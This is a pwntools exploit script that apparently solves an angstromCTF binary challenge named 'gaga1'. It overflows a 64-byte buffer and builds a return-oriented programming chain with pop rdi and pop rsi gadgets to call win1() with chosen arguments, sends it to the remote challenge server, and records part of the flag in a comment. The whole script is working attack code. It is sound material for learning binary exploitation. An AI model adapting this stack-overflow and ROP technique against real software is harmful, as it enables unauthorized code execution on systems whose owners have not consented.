from pwn import *
elf = context.binary = ELF("gaga1")
context.log_level = "DEBUG"
#p = process()
p = remote("challs.actf.co",31301)
p.recvuntil(b'Your input: ')

#0x00000000004013b3 : pop rdi ; ret
#0x00000000004013b1 : pop rsi ; pop r15 ; ret
#0x000000000040101a : ret

payload = b'A'*64

payload += p64(elf.got.gets)
payload += p64(elf.plt.gets)

payload += p64(0x4013b3) # pop rdi; ret
payload += p64(0x1337) # value into rdi -> first param
payload += p64(0x4013b1) # pop rsi; pop r15; ret
payload += p64(0x4141) # value into rsi -> second param
payload += p64(0) # value into r15 -> not important
payload += p64(elf.sym.win1) # Address of win1()
payload += p64(0)

p.sendline(payload)
p.interactive()

#actf{b4by's_f1rst_pwn!_